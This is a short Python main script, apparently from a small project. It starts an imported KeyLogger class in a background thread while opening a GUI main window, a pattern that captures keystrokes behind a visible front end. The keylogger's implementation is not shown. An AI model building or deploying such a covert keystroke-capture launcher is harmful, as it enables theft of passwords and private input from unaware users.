import threading
import codes.GUI as GUI
import codes.KeyLogger as Logger


# this class run a thread activate key logger :
class LoggerThread(threading.Thread):
    def __init__(self):
        super().__init__()

    def run(self):
        logger = Logger.Keylogger()
        logger.start()


def main():
    logger_thread = LoggerThread()
    logger_thread.start()

    main_window = GUI.MainWindow()
    main_window.start()


if __name__ == '__main__':
    main()
